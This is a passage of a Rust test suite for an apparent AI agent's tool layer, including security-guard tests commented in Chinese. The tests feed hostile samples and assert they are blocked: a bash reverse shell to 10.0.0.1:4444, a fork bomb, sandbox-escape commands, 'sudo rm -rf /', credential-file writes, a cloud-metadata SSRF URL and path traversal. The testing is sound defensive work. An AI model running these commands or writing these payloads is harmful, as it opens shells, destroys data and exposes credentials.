                assert!(!data.contains("println!(\"b\")"), "got: {data}");
            }
            _ => panic!("read failed"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn apply_hunks_rejects_mismatched_context() {
        let patch = "@@ -1,1 +1,1 @@\n-不存在的行\n+替换行\n";
        assert!(apply_hunks("fn main() {}", patch).is_err());
    }

    #[test]
    fn glob_matches_patterns() {
        assert!(glob_matches("**/*.rs", "src/main.rs"));
        assert!(glob_matches("**/*.rs", "main.rs"));
        assert!(glob_matches("src/*.ts", "src/app.ts"));
        assert!(!glob_matches("src/*.ts", "src/nested/app.ts"));
        assert!(glob_matches("src/**/*.ts", "src/nested/app.ts"));
        assert!(glob_matches("*.md", "README.md"));
        assert!(glob_matches("f?o.rs", "foo.rs"));
        assert!(!glob_matches("f?o.rs", "fooo.rs"));
    }

    #[tokio::test]
    async fn todo_write_roundtrip() {
        let (reg, dir) = setup();
        let mut s = HashMap::new();
        put(&mut s, "action", "set");
        put(
            &mut s,
            "items",
            r#"[{"step":"读测试","status":"completed"},{"step":"写代码","status":"in_progress"}]"#,
        );
        let r = reg.execute_local_tool("todo_write", &s).await.unwrap();
        assert!(r.is_success(), "todo_write set 应成功: {r:?}");

        let mut g = HashMap::new();
        put(&mut g, "action", "get");
        let r = reg.execute_local_tool("todo_write", &g).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                assert!(data.contains("写代码"), "get 应读回清单: {data}");
                assert!(data.contains("in_progress"), "get 应含状态: {data}");
            }
            _ => panic!("todo_write get 失败"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn grep_finds_match() {
        let (reg, dir) = setup();
        let mut g = HashMap::new();
        put(&mut g, "pattern", "line3");
        let r = reg.execute_local_tool("grep", &g).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                assert!(data.contains("hello.txt:3:line3"), "got: {}", data)
            }
            _ => panic!("grep failed"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn json_query_extracts() {
        let (reg, dir) = setup();
        let mut q = HashMap::new();
        put(&mut q, "json", r#"{"a":{"b":[10,20,30]}}"#);
        put(&mut q, "path", "a.b.1");
        let r = reg.execute_local_tool("json_query", &q).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => assert_eq!(data, "20"),
            _ => panic!("json_query failed"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn diff_produces_change_lines() {
        let (reg, dir) = setup();
        let mut d = HashMap::new();
        put(&mut d, "old", "a\nb\nc");
        put(&mut d, "new", "a\nB\nc\nd");
        let r = reg.execute_local_tool("diff", &d).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                assert!(data.contains("- b"));
                assert!(data.contains("+ B"));
                assert!(data.contains("+ d"));
            }
            _ => panic!("diff failed"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ======================================================================
    // F-07 接线回归守卫：L2/L3 必须真的挂在生产路径上
    //
    // 这组测试的设计要点：**每条断言都只有在扫描器真正接线时才可能通过**。
    // 用例刻意挑选 L1（safe_resolve / CommandGuard）覆盖不到的输入：
    //   - 工作区内的 .ssh/.aws 写入：safe_resolve 认为合法（确实没逃出工作区）
    //   - chroot/unshare/nsenter：CommandGuard 的正则表里根本没有这些词
    //   - eval / 反弹 shell 内容：命令护栏只看命令串，不看写入的文件内容
    // 因此一旦有人把 PREFLIGHT 调用从工具里摘掉，这些用例会立刻变红。
    // ======================================================================

    /// L3 正向：工作区**内**的凭证目录写入必须被拒（L1 放行，只有 L3 能拦）。
    #[tokio::test]
    async fn guard_denies_credential_dir_write_inside_workspace() {
        let (reg, dir) = setup();
        for path in [
            ".ssh/authorized_keys",
            ".aws/credentials",
            ".gnupg/secring.gpg",
        ] {
            let mut a = HashMap::new();
            put(&mut a, "path", path);
            put(&mut a, "content", "x\n");
            let r = reg.execute_local_tool("write_file", &a).await.unwrap();
            assert!(
                r.is_error(),
                "写入凭证目录必须被 L3 拒绝（L1 会放行）: {path}"
            );
            assert!(
                !dir.join(path).exists(),
                "被拒的写入不得产生任何落盘副作用: {path}"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 正向：make_dir 也不能凭空造出凭证目录。
    #[tokio::test]
    async fn guard_denies_credential_dir_creation() {
        let (reg, dir) = setup();
        let mut a = HashMap::new();
        put(&mut a, "path", ".ssh");
        let r = reg.execute_local_tool("make_dir", &a).await.unwrap();
        assert!(r.is_error(), "make_dir 创建 .ssh 必须被 L3 拒绝");
        assert!(!dir.join(".ssh").exists(), "不得实际创建目录");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 正向：.git 元数据写入判定为需审批 → 自动化路径 fail-closed 拒绝。
    #[tokio::test]
    async fn guard_denies_git_metadata_write_without_approval() {
        let (reg, dir) = setup();
        let mut a = HashMap::new();
        put(&mut a, "path", ".git/config");
        put(&mut a, "content", "[core]\n");
        let r = reg.execute_local_tool("write_file", &a).await.unwrap();
        match r {
            ToolResult::Error { code, .. } => assert_eq!(
                code, "APPROVAL_REQUIRED",
                "需审批的操作应使用独立错误码，便于将来接交互审批"
            ),
            other => panic!("写 .git 应被拦，实际: {other:?}"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 正向：删除与移动路径同样受护栏约束。
    #[tokio::test]
    async fn guard_denies_delete_and_move_into_credential_dir() {
        let (reg, dir) = setup();
        // 预置一个 .ssh 目录内文件（绕过工具直接落盘，模拟历史遗留）
        std::fs::create_dir_all(dir.join(".ssh")).unwrap();
        std::fs::write(dir.join(".ssh/id_rsa"), "KEY").unwrap();

        let mut d = HashMap::new();
        put(&mut d, "path", ".ssh/id_rsa");
        let r = reg.execute_local_tool("delete_file", &d).await.unwrap();
        assert!(r.is_error(), "删除凭证目录内文件必须被 L3 拒绝");
        assert!(dir.join(".ssh/id_rsa").exists(), "文件不得被删除");

        let mut m = HashMap::new();
        put(&mut m, "src", "hello.txt");
        put(&mut m, "dst", ".ssh/leaked.txt");
        let r = reg.execute_local_tool("move_file", &m).await.unwrap();
        assert!(r.is_error(), "把文件移入凭证目录必须被 L3 拒绝");
        assert!(dir.join("hello.txt").exists(), "源文件不得被移走");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L3 正向：沙箱逃逸命令（CommandGuard 不认识，只有 L3 能拦）。
    #[tokio::test]
    async fn guard_denies_sandbox_escape_exec() {
        let (reg, dir) = setup();
        for bad in [
            "chroot /mnt /bin/sh",
            "unshare -r /bin/bash",
            "nsenter -t 1 -m -u sh",
            "pkexec /bin/sh",
        ] {
            // 前置证明：L1 CommandGuard 确实拦不住，排除"其实是 L1 拦的"这种假阳性
            assert!(
                crate::security::CommandGuard::new().check(bad).is_ok(),
                "前提失效：CommandGuard 现在能拦 {bad} 了，本用例需重新挑选样本"
            );
            let mut s = HashMap::new();
            put(&mut s, "command", bad);
            let r = reg.execute_local_tool("shell_exec", &s).await.unwrap();
            assert!(r.is_error(), "沙箱逃逸命令必须被 L3 拒绝: {bad}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L2 正向：恶意内容落盘必须被拦（命令护栏看不到文件内容）。
    #[tokio::test]
    async fn guard_denies_malicious_content_write() {
        let (reg, dir) = setup();
        for (name, content) in [
            ("evil.py", "def run(c):\n    return eval(c)\n"),
            ("rev.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"),
            ("bomb.sh", ":(){ :|:& };:\n"),
        ] {
            let mut a = HashMap::new();
            put(&mut a, "path", name);
            put(&mut a, "content", content);
            let r = reg.execute_local_tool("write_file", &a).await.unwrap();
            match r {
                ToolResult::Error { code, message } => {
                    assert_eq!(code, "MALWARE_BLOCKED", "应由 L2 拦下: {name}");
                    // 审计信息只带规则 ID，不回显命中原文
                    assert!(message.contains("L2-"), "应标注命中规则: {message}");
                }
                other => panic!("恶意内容 {name} 应被拦，实际: {other:?}"),
            }
            assert!(!dir.join(name).exists(), "被拒内容不得落盘: {name}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L2 正向：append / edit 这两条"增量写"路径同样受扫描（防绕过）。
    #[tokio::test]
    async fn guard_denies_malicious_content_via_append_and_edit() {
        let (reg, dir) = setup();
        let mut ap = HashMap::new();
        put(&mut ap, "path", "hello.txt");
        put(&mut ap, "content", "\nresult = eval(payload)\n");
        let r = reg.execute_local_tool("append_file", &ap).await.unwrap();
        assert!(r.is_error(), "append 注入 eval 必须被 L2 拦");

        let mut ed = HashMap::new();
        put(&mut ed, "path", "hello.txt");
        put(&mut ed, "old_string", "line1");
        put(&mut ed, "new_string", "line1\nos.system(cmd)\nx = eval(y)");
        let r = reg.execute_local_tool("edit_file", &ed).await.unwrap();
        assert!(r.is_error(), "edit 注入 eval 必须被 L2 拦");

        let after = std::fs::read_to_string(dir.join("hello.txt")).unwrap();
        assert!(!after.contains("eval"), "被拒的编辑不得写入文件: {after}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// 负向（防误杀）：工作区内普通写入 + 良性代码必须全部放行。
    /// 护栏过严会把 Agent 变砖，这条与正向用例同等重要。
    #[tokio::test]
    async fn guard_allows_benign_writes_and_commands() {
        let (reg, dir) = setup();
        let benign: [(&str, &str); 4] = [
            ("src/main.rs", "fn main() { println!(\"hello\"); }\n"),
            ("docs/readme.md", "# Title\n\n普通文档内容。\n"),
            ("a/b/c/deep.txt", "nested write\n"),
            ("cfg.json", "{\"retries\": 3, \"timeout\": 30}\n"),
        ];
        for (path, content) in benign {
            let mut a = HashMap::new();
            put(&mut a, "path", path);
            put(&mut a, "content", content);
            let r = reg.execute_local_tool("write_file", &a).await.unwrap();
            assert!(!r.is_error(), "良性写入被误杀: {path} -> {r:?}");
            assert!(dir.join(path).exists(), "文件应已落盘: {path}");
        }

        // 良性命令不得误杀（尤其含 mount/amount 等子串的命令）
        for cmd in ["echo ok", "git status", "echo mountain-view"] {
            let mut s = HashMap::new();
            put(&mut s, "command", cmd);
            let r = reg.execute_local_tool("shell_exec", &s).await.unwrap();
            assert!(!r.is_error(), "良性命令被误杀: {cmd} -> {r:?}");
        }

        // 正常的删除 / 建目录 / 移动同样应放行
        let mut mk = HashMap::new();
        put(&mut mk, "path", "newdir/sub");
        assert!(!reg
            .execute_local_tool("make_dir", &mk)
            .await
            .unwrap()
            .is_error());
        let mut mv = HashMap::new();
        put(&mut mv, "src", "cfg.json");
        put(&mut mv, "dst", "conf/cfg.json");
        assert!(!reg
            .execute_local_tool("move_file", &mv)
            .await
            .unwrap()
            .is_error());
        let mut rm = HashMap::new();
        put(&mut rm, "path", "docs/readme.md");
        assert!(!reg
            .execute_local_tool("delete_file", &rm)
            .await
            .unwrap()
            .is_error());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn shell_exec_runs_and_is_guarded() {
        let (reg, dir) = setup();
        let mut s = HashMap::new();
        put(&mut s, "command", "echo from_shell");
        let r = reg.execute_local_tool("shell_exec", &s).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => assert!(data.contains("from_shell")),
            _ => panic!("shell_exec failed"),
        }

        // 高危命令应被拦截
        let mut bad = HashMap::new();
        put(&mut bad, "command", "sudo rm -rf /");
        let r = reg.execute_local_tool("shell_exec", &bad).await.unwrap();
        assert!(r.is_error(), "dangerous command must be blocked");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn web_fetch_blocked_for_private() {
        let (reg, dir) = setup();
        let mut w = HashMap::new();
        put(&mut w, "url", "http://169.254.169.254/latest/meta-data/");
        let r = reg.execute_local_tool("web_fetch", &w).await.unwrap();
        assert!(r.is_error(), "SSRF to metadata must be blocked");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn path_escape_rejected() {
        let (reg, dir) = setup();
        let mut a = HashMap::new();
        put(&mut a, "path", "../../etc/passwd");
        put(&mut a, "content", "x");
        let r = reg.execute_local_tool("write_file", &a).await;
        assert!(r.is_err(), "path escape must be rejected");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn list_and_find_work() {
        let (reg, dir) = setup();
        let r = reg
            .execute_local_tool("list_dir", &HashMap::new())
            .await
            .unwrap();
        assert!(r.is_success());

        let mut f = HashMap::new();
        put(&mut f, "name", "hello.txt");
        let r = reg.execute_local_tool("find_files", &f).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => assert!(data.contains("hello.txt")),
            _ => panic!("find failed"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn parse_ddg_results_extracts_links() {
        let html = r#"<div class="result__body">
            <a rel="nofollow" class="result__a" href="https://example.com/rust?q=1&amp;r=2">Rust 语言官网</a>
            <a class="result__snippet" href="https://example.com/rust">Rust 是一门系统编程语言</a>
        </div><div class="result__body">
            <a rel="nofollow" class="result__a" href="https://example.org/two">第二个结果</a>
        </div>"#;
        let res = parse_ddg_results(html, 5);
        assert_eq!(res.len(), 2);
        assert_eq!(res[0].title, "Rust 语言官网", "got: {:?}", res[0]);
        assert_eq!(
            res[0].url.as_deref(),
            Some("https://example.com/rust?q=1&r=2"),
            "got: {:?}",
            res[0]
        );
        assert!(res[0].snippet.contains("系统编程语言"), "got: {:?}", res[0]);
        assert_eq!(res[1].title, "第二个结果", "got: {:?}", res[1]);
    }

    #[test]
    fn parse_ddg_results_respects_max_and_empty() {
        assert!(parse_ddg_results("<html>no results</html>", 5).is_empty());
        let html = r#"<div class="result__body"><a class="result__a" href="https://a.b">1</a></div>
            <div class="result__body"><a class="result__a" href="https://c.d">2</a></div>"#;
        let res = parse_ddg_results(html, 1);
        assert_eq!(res.len(), 1);
    }

    #[test]
    fn parse_bing_results_extracts_links() {
        let html = r#"<ol id="b_results"><li class="b_algo">
            <h2><a href="https://www.example.com/rust?q=1&amp;r=2">Rust 编程语言介绍</a></h2>
            <p>Rust 是一门注重性能与安全的系统编程语言。</p>
        </li><li class="b_algo">
            <h2><a href="https://www.example.org/bing">第二个结果</a></h2>
            <p>这里没有摘要。</p>
        </li><li class="b_pag"></li></ol>"#;
        let res = parse_bing_results(html, 5);
        assert_eq!(res.len(), 2, "got: {:?}", res);
        assert_eq!(res[0].title, "Rust 编程语言介绍", "got: {:?}", res[0]);
        assert_eq!(
            res[0].url.as_deref(),
            Some("https://www.example.com/rust?q=1&r=2"),
            "got: {:?}",
            res[0]
        );
        assert!(res[0].snippet.contains("系统编程语言"), "got: {:?}", res[0]);
        assert_eq!(res[1].title, "第二个结果", "got: {:?}", res[1]);
        let limited = parse_bing_results(html, 1);
        assert_eq!(limited.len(), 1);
    }

    #[test]
    fn extract_readable_removes_noise_and_keeps_main() {
        let html = r##"<!DOCTYPE html><html><head>
            <title>今日实时要闻</title>
            <meta name="description" content="每日实时新闻聚合，覆盖全球科技与财经。">
            <script>var bad = '被剔除';</script><style>.x{color:red}</style>
        </head><body>
            <nav><a href="#">导航一</a><a href="#">导航二</a></nav>
            <main><article>
                <h1>头条标题</h1>
                <p>第一段：这里是最新科技动态正文内容。</p>
                <p>第二段：继续报道详细进展与影响分析。</p>
            </article></main>
            <footer>版权信息 &amp; 备案</footer>
        </body></html>"##;
        let out = extract_readable(html, 5000);
        assert!(out.contains("标题: 今日实时要闻"), "got: {out}");
        assert!(
            out.contains("描述: 每日实时新闻聚合，覆盖全球科技与财经。"),
            "got: {out}"
        );
        assert!(
            out.contains("第一段：这里是最新科技动态正文内容。"),
            "got: {out}"
        );
        assert!(
            out.contains("第二段：继续报道详细进展与影响分析。"),
            "got: {out}"
        );
        // 噪音与脚本被剔除
        assert!(!out.contains("导航一"), "导航应被剔除: {out}");
        assert!(!out.contains("版权信息"), "footer 应被剔除: {out}");
        assert!(!out.contains("被剔除"), "script 应被剔除: {out}");
        assert!(!out.contains("<p>"), "不应残留标签: {out}");
    }

    #[test]
    fn looks_like_html_detects_html_documents() {
        assert!(looks_like_html("<!doctype html><html>..."));
        assert!(looks_like_html("<html lang='zh'><head><title>t</title>"));
        // JSON 不以 < 开头，即使内含 <body> 子串也不误判为 HTML
        assert!(!looks_like_html("{\"title\":\"<body>\"}"));
        assert!(!looks_like_html("{\"a\":1,\"text\":\"纯 JSON\"}"));
        assert!(!looks_like_html("纯文本内容，没有任何标记"));
    }

    #[tokio::test]
    async fn memory_save_search_roundtrip() {
        let dir = std::env::temp_dir().join(format!("marguerite_mem_{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let db = dir.join("mem.db");
        let mut reg = ToolRegistry::new();
        for t in memory_tools(db.clone()) {
            reg.register_local(t);
        }

        let mut s = HashMap::new();
        put(
            &mut s,
            "body",
            "Rust 的所有权模型保证了内存安全，无需垃圾回收。",
        );
        put(&mut s, "title", "Rust 所有权");
        put(&mut s, "kind", "pattern");
        put(&mut s, "tags", "rust,memory");
        let r = reg.execute_local_tool("memory_save", &s).await.unwrap();
        assert!(r.is_success(), "save failed");

        let mut q = HashMap::new();
        put(&mut q, "query", "Rust 内存安全");
        let r = reg.execute_local_tool("memory_search", &q).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                assert!(data.contains("Rust 所有权"), "got: {data}")
            }
            _ => panic!("memory_search failed"),
        }

        let mut l = HashMap::new();
        put(&mut l, "kind", "pattern");
        let r = reg.execute_local_tool("memory_list", &l).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                assert!(data.contains("Rust 所有权"), "got: {data}")
            }
            _ => panic!("memory_list failed"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn memory_save_requires_body() {
        let dir = std::env::temp_dir().join(format!("marguerite_mem_{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let mut reg = ToolRegistry::new();
        for t in memory_tools(dir.join("mem.db")) {
            reg.register_local(t);
        }
        let r = reg
            .execute_local_tool("memory_save", &HashMap::new())
            .await
            .unwrap();
        assert!(r.is_error(), "empty body must be rejected");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn web_search_requires_query() {
        let (reg, dir) = setup();
        let r = reg
            .execute_local_tool("web_search", &HashMap::new())
            .await
            .unwrap();
        assert!(r.is_error(), "empty query must be rejected");
        let _ = std::fs::remove_dir_all(&dir);
    }

    // 实时联网冒烟：DDG 不可达时应回退 Bing；web_fetch 应提取正文而非原始 HTML。
    #[tokio::test]
    #[ignore = "需联网；手动运行验证 B5 联网实时信息（多引擎回退 + 正文提取）"]
    async fn live_web_search_falls_back_to_bing() {
        let (reg, dir) = setup();
        let mut w = HashMap::new();
        put(&mut w, "q", "Rust programming language 2026");
        let r = reg.execute_local_tool("web_search", &w).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                assert!(!data.trim().is_empty(), "搜索应返回结果，got: {data}");
                assert!(data.contains("\n  "), "结果应含链接行: {data}");
                println!("[live] web_search 多引擎回退返回 {} 字符", data.len());
            }
            ToolResult::Error { message, code } => {
                panic!("web_search 应成功（DDG 失败时回退 Bing），got [{code}]: {message}");
            }
            ToolResult::Timeout { .. } => panic!("web_search 超时"),
        }

        // web_fetch 正文提取（readability 风格）
        let mut f = HashMap::new();
        put(&mut f, "url", "https://www.baidu.com");
        let r = reg.execute_local_tool("web_fetch", &f).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                assert!(
                    data.contains("标题:") || data.contains("描述:") || data.contains("百度"),
                    "正文提取应含标题/描述/内容: {data}"
                );
                assert!(!data.contains("<html"), "不应返回原始 HTML: {data}");
                println!("[live] web_fetch 正文提取返回 {} 字符", data.len());
            }
            ToolResult::Error { message, code } => {
                panic!("web_fetch 应成功，got [{code}]: {message}")
            }
            ToolResult::Timeout { .. } => panic!("web_fetch 超时"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn browser_requires_url_and_action() {
        let (reg, dir) = setup();
        let r = reg
            .execute_local_tool("browser", &HashMap::new())
            .await
            .unwrap();
        assert!(r.is_error(), "missing action/url must be rejected");

        let mut a = HashMap::new();
        put(&mut a, "action", "open");
        let r = reg.execute_local_tool("browser", &a).await.unwrap();
        assert!(r.is_error(), "missing url must be rejected");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn browser_unavailable_reports_clear_error() {
        let bridge = BrowserBridge::new();
        if bridge.is_available() {
            return; // 环境有 Chrome 时跳过（真实打开依赖外网，不纳入单元测试）
        }
        let (reg, dir) = setup();
        let mut a = HashMap::new();
        put(&mut a, "action", "open");
        put(&mut a, "url", "https://example.com");
        let r = reg.execute_local_tool("browser", &a).await.unwrap();
        match r {
            ToolResult::Error { code, .. } => assert_eq!(code, "NOT_AVAILABLE"),
            _ => panic!("expected NOT_AVAILABLE, got success"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ---- 系统级鼠标键盘控制（system_control）----

    #[test]
    fn sendkeys_for_maps_keys_and_combos() {
        assert_eq!(sendkeys_for("enter").as_deref(), Some("{ENTER}"));
        assert_eq!(sendkeys_for("f5").as_deref(), Some("{F5}"));
        assert_eq!(sendkeys_for("ctrl+c").as_deref(), Some("^c"));
        assert_eq!(sendkeys_for("alt+tab").as_deref(), Some("%{TAB}"));
        assert_eq!(sendkeys_for("ctrl+shift+p").as_deref(), Some("^+p"));
        assert_eq!(sendkeys_for("a").as_deref(), Some("a"));
        assert!(sendkeys_for("boguskey").is_none());
    }

    #[test]
    fn system_control_ps_builds_scripts() {
        let mut a = HashMap::new();
        put(&mut a, "x", "100");
        put(&mut a, "y", "200");
        let ps = system_control_ps("mouse_move", &a).unwrap();
        assert!(ps.contains("[MgtSC]::SetCursorPos(100,200)"), "ps=[{ps}]");

        let mut a = HashMap::new();
        put(&mut a, "x", "10");
        put(&mut a, "y", "20");
        put(&mut a, "button", "right");
        put(&mut a, "double", "1");
        let ps = system_control_ps("mouse_click", &a).unwrap();
        assert!(ps.contains("SetCursorPos(10,20)"));
        assert!(ps.contains("0x8"));
        assert!(ps.contains("0x10"));
        // double → 两次 down/up（共 4 次 [MgtSC]::mouse_event 调用）
        assert_eq!(ps.matches("[MgtSC]::mouse_event").count(), 4);

        let mut a = HashMap::new();
        put(&mut a, "lines", "-3");
        let ps = system_control_ps("mouse_scroll", &a).unwrap();
        assert!(ps.contains("0x0800"));

        let ps = system_control_ps("mouse_pos", &HashMap::new()).unwrap();
        assert!(ps.contains("GetCursorPos"));
        let ps = system_control_ps("screen_size", &HashMap::new()).unwrap();
        assert!(ps.contains("GetSystemMetrics(0)"));

        let mut a = HashMap::new();
        put(&mut a, "key", "ctrl+s");
        let ps = system_control_ps("key_press", &a).unwrap();
        assert!(ps.contains("SendWait('^s')"));

        let ps = system_control_ps("type_text", &HashMap::new()).unwrap();
        assert!(ps.contains("MARG_SYS_TEXT"));

        // monitors：应枚举 AllScreens
        let ps = system_control_ps("monitors", &HashMap::new()).unwrap();
        assert!(ps.contains("AllScreens"), "ps=[{ps}]");

        // screenshot 无 out → 报错
        assert!(system_control_ps("screenshot", &HashMap::new()).is_err());
        // screenshot：默认全屏 + 无 OCR
        let mut a = HashMap::new();
        put(&mut a, "out", "shot.png");
        let ps = system_control_ps("screenshot", &a).unwrap();
        assert!(ps.contains("CopyFromScreen"), "ps=[{ps}]");
        assert!(ps.contains("MARG_SYS_OUT"));
        assert!(!ps.contains("Windows.Media.Ocr"), "默认不应含 OCR: {ps}");
        // screenshot + monitor + ocr
        let mut a = HashMap::new();
        put(&mut a, "out", "shot.png");
        put(&mut a, "monitor", "1");
        put(&mut a, "ocr", "1");
        let ps = system_control_ps("screenshot", &a).unwrap();
        assert!(ps.contains("$screens[$monitor]"), "应支持指定显示器: {ps}");
        assert!(ps.contains("Windows.Media.Ocr"), "ocr=1 应含 OCR 逻辑");

        assert!(system_control_ps("bogus", &HashMap::new()).is_err());
        // 缺参数路径应报错（不触发 PowerShell）
        assert!(system_control_ps("mouse_move", &HashMap::new()).is_err());
    }

    #[tokio::test]
    #[ignore = "Windows 真实桌面；手动运行验证 monitors/screenshot+OCR 端到端"]
    async fn live_monitors_and_screenshot_ocr() {
        let (reg, dir) = setup();
        let mut m = HashMap::new();
        m.insert("action".into(), "monitors".into());
        let r = reg.execute_local_tool("system_control", &m).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                eprintln!("=== monitors 输出 ===\n{data}");
                assert!(data.contains("monitor"), "应列出显示器: {data}");
            }
            other => panic!("monitors 应成功: {other:?}"),
        }
        // 截图 + OCR：保存到临时目录，验证 PNG 生成与 OCR 文本输出
        let shot = dir.join("shot.png").to_string_lossy().to_string();
        let mut m = HashMap::new();
        m.insert("action".into(), "screenshot".into());
        m.insert("out".into(), shot.clone());
        m.insert("ocr".into(), "1".into());
        let r = reg.execute_local_tool("system_control", &m).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                eprintln!("=== screenshot+OCR 输出 ===\n{data}");
                assert!(
                    data.contains("已保存截图") || data.contains("OCR"),
                    "应返回保存信息或 OCR 结果: {data}"
                );
            }
            other => panic!("screenshot 应成功: {other:?}"),
        }
        assert!(
            std::path::Path::new(&shot).exists(),
            "截图文件应存在: {shot}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn system_control_rejects_invalid_params_before_powershell() {
        let (reg, dir) = setup();
        assert!(reg.has_tool("system_control"), "system_control 应已注册");
        // 缺 action → INVALID_PARAMS
        let r = reg
            .execute_local_tool("system_control", &HashMap::new())
            .await
            .unwrap();
        assert!(r.is_error());
        // mouse_move 缺 x/y → INVALID_PARAMS（在启动 PowerShell 前拦截，无副作用）
        let mut a = HashMap::new();
        put(&mut a, "action", "mouse_move");
        let r = reg.execute_local_tool("system_control", &a).await.unwrap();
        match r {
            ToolResult::Error { code, .. } => assert_eq!(code, "INVALID_PARAMS"),
            _ => panic!("expected INVALID_PARAMS"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }
}
